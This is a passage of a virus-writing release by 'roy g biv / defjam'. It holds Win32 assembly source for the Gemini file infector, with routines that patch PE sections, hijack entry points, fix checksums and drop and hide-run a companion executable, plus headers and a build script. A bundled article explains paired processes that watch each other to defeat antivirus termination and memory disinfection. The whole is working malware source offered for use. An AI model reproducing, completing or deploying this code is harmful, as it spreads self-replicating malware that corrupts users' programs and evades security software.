        jmp     dword ptr [eax * 4 + '!bgr']
call_krncrc     endp

;-----------------------------------------------------------------------------
;infect file in two parts
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to some code.  very simple
;               however, that code just drops exe and returns
;               exe contains infection routine
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label     label   near
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        movzx   eax, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum]
        imul    eax, eax, size pesect
        movzx   ecx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        add     eax, ecx
        lea     esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset gemini_codeend - offset gemini_exe
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword ptr [esi]
        add     edi, edx
        lea     edx, dword ptr [eax + ecx]
        mov     esi, offset gemini_exe - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehinfret]
                                                ;delta offset
        rep     movs byte ptr [edi], byte ptr [esi]

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

        add     eax, offset gemini_inf - offset gemini_exe
        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], eax
        sub     eax, edx
        mov     dword ptr [edi + offset host_patch - offset gemini_codeend + 1], eax
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        xor     eax, eax
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     ax, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;virus code begins here in infected files
;-----------------------------------------------------------------------------

gemini_inf      label   near
        pushad
        call    walk_seh

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

expcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (expcrc_count + 1) dup (0)
expcrcend       label   near
        dd      offset drop_exp - offset expcrcend + 4

explabel        label   near
        db      exename, ".exe", 0
        db      0ch - (offset $ - offset explabel) dup (0)

expsize equ     0d4h
;RLE-based compressed MZ header, PE header, import table, section table
        dd      11111111110000011100001011100000b
        ;       mmmmmmmmmmz   01mmz   02mmm
        db      'M', 'Z', "gdi32.dll", 'P', 'E', 4ch, 1, 1
        dd      00000110000111100001001010010000b
        ;       z   01mz   03mmz   02r   04m
        db      2, 2ch, 10h, 88h
        dd      00000111110100100001001000111110b
        ;       z   01mmmmr   02z   04mz   07mm
        db      0fh, 3, 0bh, 1, 56h, expsize, 10h
        dd      00001001010010001011000010100001b
        ;       z   02r   04mz   05mz   02mz   02
        db      0ch, 40h, 10h
        dd      00000110000101010111100001111100b
        ;       z   01mz   02mr   07mz   03mmm
        db      2, 1, 4, "Arc"
        dd      00001010000101000111100000101001b
        ;       z   02mz   03mz   07mz   01r   02
        db      ((gemini_codeend - offset gemini_exe + expsize + 1fffh) and not 0fffh) shr 8, expsize, 2
        dd      10000111000011100001110000110101b
        ;       mz   03mz   03mz   03mz   03r  04
        db      1, 1, 1, 1
        dd      10001110101001100101001111001111b
        ;       mz   07r   04mmz   0ar   0er   0e
        db      2, 8, 10h
        dd      00010110000111000010100001101100b
        ;       z   05mz   03mz   02mz   03r   08
        db      10h, ((gemini_codeend - offset gemini_exe + expsize + 1ffh) and not 1ffh) shr 8, 1
        dd      00011110000000000000000000000000b
        ;       z   07m
        db      0e0h
        dd      0
;decompressed data follow.  'X' bytes are set to random value every time
;       db      'M', 'Z'                ;00
;       db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)
;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)
;       dw      14ch                    ;10 04 machine (overload for forwarder chain)
;       dw      1                       ;12 06 number of sections (overload for forwarder chain)
;       dd      2                       ;14 08 date/time stamp (overload for dll name RVA)
;       dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)
;       db      X, X, X, X              ;1c 10 number of symbols
;       dw      88h                     ;20 14 size of optional header
;       dw      30fh                    ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       db      X                       ;26 1a major linker
;       db      X                       ;27 1b minor linker
;       dd      0                       ;28 1c size of code (overload for import table terminator)
;       dd      56h                     ;2c 20 size of init data (overload for import name table RVA)
;       dd      0                       ;30 24 size of uninit data (overload for import name table terminator)
;       dd      expsize + 1000h         ;34 28 entry point
;       db      X, X, X, X              ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      400000h                 ;40 34 image base
;       dd      1000h                   ;44 38 section align
;       dd      200h                    ;48 3c file align
;       db      1, X                    ;4c 40 major os
;       db      X, X                    ;4e 42 minor os
;       db      X, X                    ;50 44 major image
;       db      X, X                    ;52 46 minor image
;       dw      4                       ;54 48 major subsys
;       dw      0                       ;56 4a minor subsys (overload for import name table)
;       db      "Arc", 0                ;58 4c reserved (overload for import name table)
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      expsize                 ;60 54 size of headers
;       dd      0                       ;64 58 checksum
;       dw      2                       ;68 5c subsystem
;       db      X, X                    ;6a 5e dll characteristics
;       dd      1                       ;6c 60 size of stack reserve
;       dd      1                       ;70 64 size of stack commit
;       dd      1                       ;74 68 size of heap reserve
;       dd      1                       ;78 6c size of heap commit
;       db      X, X, X, X              ;7c 70 loader flags
;       dd      2                       ;80 74 number of rva and sizes (ignored by Windows 9x/Me)
;       dd      0                       ;84 78 export
;       db      X, X, X, X              ;88 7c export
;       dd      1008h                   ;8c 80 import
;       dd      0                       ;90 84 import
;       dd      0                       ;94 88 resource
;       db      X, X, X, X              ;98 8c resource
;       db      X, X, X, X, X, X, X, X  ;9c 90 exception
;       db      X, X, X, X, X, X, X, X  ;a4 98 certificate
;       db      X, X, X, X, X, X, X, X  ;ac a0 base reloc (overload for section name)
;       dd      0                       ;b4 a8 debug (overload for virtual size)
;       dd      1000h                   ;b8 ac debug (overload for virtual address)
;       dd      (aligned size of code)  ;bc b0 architecture (overload for file size)
;       dd      1                       ;c0 b4 architecture (overload for file offset)
;       db      X, X, X, X              ;c4 b8 global data (overload for pointer to relocs)
;       db      X, X, X, X              ;c8 bc global data (overload for pointer to line numbers)
;       dd      0                       ;cc c0 tls (overload for reloc table and line numbers)
;       dd      0e0000000h              ;d0 c4 tls (overload for section characteristics)
;                                       ;d4

drop_exp        label   near
        mov     ebx, esp
        lea     esi, dword ptr [edi + offset explabel - offset drop_exp]
        mov     edi, offset gemini_codeend - offset gemini_exe + expsize + 1ffh
                                                ;file size must be > end of last section
        push    edi
        xor     ebp, ebp                        ;GMEM_FIXED
        push    ebp
        call    dword ptr [ebx + expcrcstk.pGlobalAlloc]
        push    eax                             ;GlobalFree
        push    ebp                             ;WriteFile
        push    esp                             ;WriteFile
        push    edi                             ;WriteFile
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        push    eax                             ;CreateFileA
        lea     ecx, dword ptr [eax + 7fh]
        push    ecx                             ;MoveFileA
        push    eax                             ;MoveFileA
        push    eax                             ;GetFileAttributesA
        push    ebp                             ;SetFileAttributesA
        push    eax                             ;SetFileAttributesA
        push    ecx                             ;DeleteFileA
        push    ecx                             ;GetTempFileNameA
        push    ebp                             ;GetTempFileNameA
        push    esp                             ;GetTempFileNameA
        push    eax                             ;GetTempFileNameA
        push    edi                             ;GetWindowsDirectoryA
        push    eax                             ;GetWindowsDirectoryA
        xchg    ebp, eax
        call    dword ptr [ebx + expcrcstk.pGetWindowsDirectoryA]
        lea     edi, dword ptr [ebp + eax - 1]
        call    dword ptr [ebx + expcrcstk.pGetTempFileNameA]
        call    dword ptr [ebx + expcrcstk.pDeleteFileA]
        mov     al, '\'
        scas    byte ptr [edi]
        je      skip_slash
        stos    byte ptr [edi]

;-----------------------------------------------------------------------------
;append exe name, assumes name is 0ch bytes long
;-----------------------------------------------------------------------------

skip_slash      label   near
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]

;-----------------------------------------------------------------------------
;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + expcrcstk.pSetFileAttributesA]
        call    dword ptr [ebx + expcrcstk.pGetFileAttributesA]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        pop     ecx
        pop     eax
        je      skip_move
        push    eax
        push    ecx
        call    dword ptr [ebx + expcrcstk.pMoveFileA]

skip_move       label   near
        call    dword ptr [ebx + expcrcstk.pCreateFileA]
        push    edi                             ;WriteFile
        push    ebx
        xchg    ebp, eax
        call    dword ptr [ebx + expcrcstk.pGetTickCount]
        xchg    ebx, eax
        xor     ecx, ecx

;-----------------------------------------------------------------------------
;decompress MZ header, PE header, section table, import table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        add     eax, eax
        sbb     dl, dl
        and     dl, bl
        shld    ecx, eax, 4
        rol     ebx, cl
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cx, offset gemini_codeend - offset gemini_exe
        sub     esi, offset drop_exp - offset gemini_exe
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     ebx
        push    ebp
        call    dword ptr [ebx + expcrcstk.pWriteFile]
        push    ebp
        call    dword ptr [ebx + expcrcstk.pCloseHandle]
        pop     eax
        push    eax
        inc     ebp
        je      host_ret                        ;allow only 1 copy to run
        push    SW_HIDE
        push    eax
        call    dword ptr [ebx + expcrcstk.pWinExec]

host_ret        label   near
        add     esp, 4 + size expcrcstk
        popad

host_patch      label   near
        db      0e9h, 'rgb!'                    ;must be last bytes in file

gemini_codeend  label   near
gemini_exe      endp

.code
dropper         label   near
        mov     edx, expcrc_count
        mov     ebx, offset expnames
        mov     edi, offset expcrcbegin
        call    create_crcs
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, sfccrc_count
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        call    patch_host
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

create_crcs     proc    near
        imul    ebp, edx, 4

create_loop     label   near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        push    eax
        dec     edx
        jne     create_loop
        mov     eax, esp
        push    ecx
        push    ebp
        push    eax
        push    edi
        call    GetCurrentProcess
        push    eax
        xchg    esi, eax
        call    WriteProcessMemory
        add     esp, ebp
        ret
create_crcs     endp
end             dropper
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[GEMINI.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[GEMINI.INC]컴�
MAX_PATH                        equ     260

FILE_ATTRIBUTE_DIRECTORY        equ     00000010h

CREATE_ALWAYS                   equ     2
OPEN_EXISTING                   equ     3

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

SW_HIDE                         equ     0

GMEM_FIXED                      equ     0
GMEM_ZEROINIT                   equ     40h

STATUS_TIMEOUT                  equ     102h
WAIT_TIMEOUT                    equ     STATUS_TIMEOUT

PROCESS_VM_READ                 equ     10h

EVENT_MODIFY_STATE              equ     2
SYNCHRONIZE                     equ     100000h

DRIVE_FIXED                     equ     3
DRIVE_REMOTE                    equ     4

IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_32BIT_MACHINE        equ     0100h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

SECTION_MAP_WRITE               equ     0002h

FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

PAGE_READWRITE                  equ     04

SLEEPLEN                        equ     01
TIMEOUT                         equ     03 ;seconds to wait for remote process to signal
                                           ;should be >= INT((SLEEPLEN * 2.5) + 0.5)

RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

align           1                               ;byte-packed structures
expcrcstk       struct
        pWriteFile                      dd      ?
        pWinExec                        dd      ?
        pSetFileAttributesA             dd      ?
        pMoveFileA                      dd      ?
        pGlobalFree                     dd      ?
        pGlobalAlloc                    dd      ?
        pGetWindowsDirectoryA           dd      ?
        pGetTickCount                   dd      ?
        pGetTempFileNameA               dd      ?
        pGetFileAttributesA             dd      ?
        pDeleteFileA                    dd      ?
        pCreateFileA                    dd      ?
        pCloseHandle                    dd      ?
expcrcstk       ends
expcrc_count    equ     size expcrcstk shr 2

krncrcstk       struct
        kWaitForSingleObject    dd      ?
        kUnmapViewOfFile        dd      ?
        kSleep                  dd      ?
        kSetFileTime            dd      ?
        kSetFileAttributesW     dd      ?
        kSetFileAttributesA     dd      ?
        kSetEvent               dd      ?
        kSetCurrentDirectoryW   dd      ?
        kSetCurrentDirectoryA   dd      ?
        kResetEvent             dd      ?
        kReadProcessMemory      dd      ?
        kOpenProcess            dd      ?
        kOpenEventA             dd      ?
        kMultiByteToWideChar    dd      ?
        kMapViewOfFile          dd      ?
        kLoadLibraryA           dd      ?
        kGlobalFree             dd      ?
        kGlobalAlloc            dd      ?
        kGetVersion             dd      ?
        kGetTickCount           dd      ?
        kGetStartupInfoA        dd      ?
        kGetFullPathNameW       dd      ?
        kGetFullPathNameA       dd      ?
        kGetDriveTypeA          dd      ?
        kGetCurrentProcessId    dd      ?
        kGetCommandLineA        dd      ?
        kFindNextFileW          dd      ?
        kFindNextFileA          dd      ?
        kFindFirstFileW         dd      ?
        kFindFirstFileA         dd      ?
        kFindClose              dd      ?
        kCreateThread           dd      ?
        kCreateProcessA         dd      ?
        kCreateFileMappingA     dd      ?
        kCreateFileW            dd      ?
        kCreateFileA            dd      ?
        kCreateEventA           dd      ?
        kCloseHandle            dd      ?
krncrcstk       ends
krncrc_count    equ     size krncrcstk shr 2

sfccrcstk       struct
        sSfcIsFileProtected     dd      ?
sfccrcstk       ends
sfccrc_count    equ     size sfccrcstk shr 2

startupinfo     struct
        sicb                    dd      ?
        siReserved              dd      ?
        siDesktop               dd      ?
        siTitle                 dd      ?
        sidwX                   dd      ?
        sidwY                   dd      ?
        sidwXSize               dd      ?
        sidwYSize               dd      ?
        sidwXCountChars         dd      ?
        sidwYCountChars         dd      ?
        sidwFillAttribute       dd      ?
        sidwFlags               dd      ?
        siwShowWindow           dw      ?
        sicbReserved2           dw      ?
        silpReserved2           dd      ?
        sihStdInput             dd      ?
        sihStdOutput            dd      ?
        sihStdError             dd      ?
startupinfo     ends

processinfo     struct
        pihProcess      dd      ?
        pihThread       dd      ?
        pidwProcessId   dd      ?
        pidwThreadId    dd      ?
processinfo     ends

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr   ends

FILETIME        struct
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME        ends

WIN32_FIND_DATA struct
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        <?>
        ftLastAccessTime        FILETIME        <?>
        ftLastWriteTime         FILETIME        <?>
        dwFileSizeHigh          dd              ?
        dwFileSizeLow           dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               dw              260 dup (?)
        cAlternateFileName      dw              14 dup (?)
WIN32_FIND_DATA ends

findlist        struct
        findprev        dd                      ?
        findhand        dd                      ?
        finddata        WIN32_FIND_DATA         <?>
findlist        ends

sehstruc        struct
        sehkrnlret      dd      ?
        sehexcptrec     dd      ?
        sehprevseh      dd      ?
sehstruc        ends

pesect          struct
        sectname        db      8 dup (?)
        sectvirtsize    dd      ?
        sectvirtaddr    dd      ?
        sectrawsize     dd      ?
        sectrawaddr     dd      ?
        sectreladdr     dd      ?
        sectlineaddr    dd      ?
        sectrelcount    dw      ?
        sectlinecount   dw      ?
        sectflags       dd      ?
pesect          ends

mapsehstk       struct
        mapsehprev      dd      ?
        mapsehexcpt     dd      ?
        mapsehregs      dd      8 dup (?)
        mapsehsehret    dd      ?
        mapsehinfret    dd      ?
mapsehstk       ends

infectstk       struct
        inffilesize     dd              ?
        infseh          mapsehstk       <?>
infectstk       ends

align                                           ;restore default alignment
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[GEMINI.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[TWINS.TXT]컴�
                         I get by with a little help
                               from my friends
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


About the author:

Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and  Virus Bulletin 9/95 for a description of what  they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam,  coded  with  Prototype in 1993).  Designer of the world's  first  XMS
swapping  virus (John Galt, coded by RTFishel in 1995, only 30 bytes stub, the
rest  is  swapped  out).   Author of world's first virus  using  Thread  Local
Storage  for  replication  (Shrug) and world's first Native  executable  virus
(Chthon).   Author  of  various retrovirus articles (eg see Vlad  #7  for  the
strings  that make your code invisible to TBScan).  Went to sleep for a number
of years.  This is my fifth virus for Win32.

I'm also available for joining a group.  Just in case anyone is interested. ;)


What is process co-operation?

Process  co-operation  is a technique where one process verifies the state  of
another  process, and the other process verifies the state of the one process.
There  can also be more than two processes involved.  If we consider the  case
of  two  processses,  one process is called "Local" and the other  process  is
called  "Remote", then the Local process can ensure that the Remote process is
still  running;  the Local process can ensure that the Remote process is still
active (that is has not been suspended); the Local process can ensure that the
Remote  process has not been altered.  If the Remote process has been  altered
or  terminated, then the Local process can start a new instance of the  Remote
process;  if the Remote process has been suspended, then the Local process can
resume  the Remote process or start a new instance of the Remote process.   If
the  Remote process contains the same code, then the Remote process can ensure
the  same  things  about  the Local process and perform the  same  actions  in
response.   This makes it a very powerful technique to protect against  forced
termination and "disinfection" of the memory image by AV softwares.

This is not a new technique, but this seems to be the first time on Windows.
The earliest reference that I found is the mid 1970s (older than me ;) ).
(www.tuxedo.org/~esr/jargon/jargon.html#The%20Meaning%20of%20Hack)

Let's see the algorithm for one process that runs as two instances.
First there is some startup code:

if argc == 1                            ;first time execution
{
restart:
    do
    {
        event1 = true                   ;set initial states
        event2 = false                  ;set intial states
        pid2 = run(process2, pid1)      ;run second instance
    }
    while !wait (event2, timeout)       ;loop if Remote process dies
}

So now we have two instances running.  We enter the main loop:

process 1 (Local)                       process 2 (Remote)

do                                      do
{                                       {
    if event1                               if event2
        break                                   break
    event2 = false                          event1 = false
    if !checksum(pid2)                      if !checksum(pid1)
        break                                   break
    event1 = true                           event2 = true
}                                       }
while wait (event2, timeout)            while wait (event1, timeout)
goto restart                            goto restart

Let's examine line by line:

    if event1
        break

If the Local event was not reset by the Remote process, then we think that the
Remote process is suspended or terminated, so we exit the loop and restart the
Remote process.

    event2 = false

Reset the Remote event.  Dis is one half ;) of the "I'm alive" checking.

    if !checksum(pid2)
        break

If  the Remote checksum fails then the memory image of the Remote process  has
been altered, so we exit the loop and restart the Remote process.

    event1 = true

Set the Local event.  This is the other half of the "I'm alive" checking.

    while wait (event2, timeout)

Loop while Remote event signals before timeout expires.

That's it.  So simple.  We are ready for ourselves.  Are you?


Greets to the old Defjam crew:

Prototype, RTFishel, Obleak, and The Gingerbread Man


rgb/dj feb 2002
iam_rgb@hotmail.com
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[TWINS.TXT]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
if %1.==. goto usage
%tasm32%\bin\tasm32 /r /ml /m9 /os /p /q /w2 /zn %1
if errorlevel 1 goto end
%tasm32%\bin\tlink32 /c /B:400000 /Tpe /aa /x /n %1.obj,,,%tasm32%\lib\import32.lib,
del %1.obj
goto end

:usage
echo.
echo Usage: MAKE filename
echo eg. MAKE EFISHNC
echo requires %tasm32% set to TASM directory (eg C:\TASM)

:end
echo.
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
